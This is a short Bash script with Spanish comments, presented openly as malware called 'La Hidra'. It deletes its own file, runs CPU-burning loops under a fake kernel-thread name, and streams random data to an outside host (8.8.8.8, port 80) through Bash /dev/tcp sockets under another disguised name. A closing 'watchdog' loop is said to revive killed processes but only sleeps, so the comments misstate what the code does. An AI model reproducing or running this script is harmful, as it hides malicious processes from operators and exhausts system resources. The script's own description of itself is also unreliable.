#!/bin/bash
# Malware Nivel Sayallin: La Hidra

# 1. Borrar el archivo del disco inmediatamente. Ahora el script solo existe en RAM.
rm -- "$0"

# Función de carga de CPU (Sin usar 'stress', usando utilidades nativas)
burn_cpu() {
    while true; do
        # Comprime basura infinita y la envía a la nada. Nombre falso: [ext4-jbd2]
        exec -a "[ext4-jbd2]" bash -c 'cat /dev/urandom | gzip -9 > /dev/null'
    done
}

# Función de Exfiltración (Sin curl/wget. Usando sockets de Bash puros)
steal_data() {
    while true; do
        # Nombre falso: [bioset]. Conecta directo a un puerto 80 externo.
        exec -a "[bioset]" bash -c 'cat /dev/urandom > /dev/tcp/8.8.8.8/80' 2>/dev/null
        sleep 2
    done
}

# 2. Levantar los procesos maliciosos en segundo plano
burn_cpu &
burn_cpu &
steal_data &

# 3. El Bucle de la Hidra (Vigilante)
while true; do
    # Si hay menos de 3 procesos corriendo, levanta otro.
    # Si matas a un hijo, este bucle lo revive en menos de 1 segundo.
    sleep 1
done
